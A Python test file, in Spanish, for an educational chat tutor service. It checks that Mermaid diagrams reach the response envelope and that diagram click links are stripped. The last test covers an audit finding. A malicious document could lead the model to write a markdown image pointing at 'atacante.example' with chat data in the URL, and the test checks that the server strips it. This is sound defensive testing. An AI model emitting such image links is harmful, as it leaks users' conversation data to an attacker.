"""El chat entrega solo esquemas pintables y los anuncia en el envelope (ADR-048)."""
from unittest.mock import AsyncMock
from uuid import uuid4

import pytest

from src.application.services.chat_tutor_service import ChatTutorService
from src.application.services.topic_catalog import TopicCatalog

BUENO = 'flowchart TD\n  A["Luz"] --> B["Glucosa"]'
RESPUESTA = (
    "La fotosíntesis convierte luz en glucosa.\n\n"
    f"```mermaid\n{BUENO}\n```\n\n"
    "Y otro, con un enlace:\n\n```mermaid\nflowchart TD\n  A --> B\n  click A \"https://x\"\n```"
)


def _servicio():
    gate = AsyncMock()
    gate.answer_question = AsyncMock(return_value=RESPUESTA)

    async def stream(**_):
        for trozo in (RESPUESTA[:40], RESPUESTA[40:]):
            yield trozo

    gate.answer_question_stream = stream
    return ChatTutorService(llm_gate=gate, topic_catalog=TopicCatalog())


@pytest.mark.asyncio
async def test_sin_streaming_el_envelope_trae_el_esquema_y_el_texto_va_limpio():
    r = await _servicio().answer(None, "hazme un esquema de la fotosíntesis", uuid4())

    assert r.envelope.payload["visuals"] == [{"kind": "mermaid", "diagram": "flowchart", "source": BUENO}]
    assert r.content == r.envelope.payload["content"]
    assert "click" not in r.content and r.content.count("```mermaid") == 1


@pytest.mark.asyncio
async def test_en_streaming_el_cierre_trae_el_texto_limpio():
    trozos = [t async for t in _servicio().answer_stream(None, "dibújame la fotosíntesis", uuid4())]
    final, envelope = trozos[-1]

    # Los tokens crudos ya se mostraron; lo que cuenta es el cierre.
    assert "".join(t for t, e in trozos[:-1]) == RESPUESTA
    assert envelope is not None and "click" not in final
    assert envelope.payload["content"] == final
    assert [v["diagram"] for v in envelope.payload["visuals"]] == ["flowchart"]


@pytest.mark.asyncio
async def test_sin_esquemas_no_hay_campo_visuals():
    servicio = _servicio()
    servicio._llm_gate.answer_question = AsyncMock(return_value="Solo texto.")
    r = await servicio.answer(None, "¿qué es la fotosíntesis?", uuid4())
    assert "visuals" not in r.envelope.payload and r.content == "Solo texto."


@pytest.mark.asyncio
async def test_una_imagen_ajena_escrita_por_el_modelo_no_se_entrega():
    """Auditoría de la #80: un documento malicioso podría hacer que el modelo pinte una
    imagen que filtre datos en la URL. El servidor la quita antes de entregar y guardar."""
    servicio = _servicio()
    servicio._llm_gate.answer_question = AsyncMock(
        return_value="Aquí tienes. ![x](https://atacante.example/p.png?d=secreto-del-chat)"
    )
    r = await servicio.answer(None, "¿qué es la fotosíntesis?", uuid4())
    assert "atacante.example" not in r.content and "[Imagen: x]" in r.content
    assert r.envelope.payload["content"] == r.content
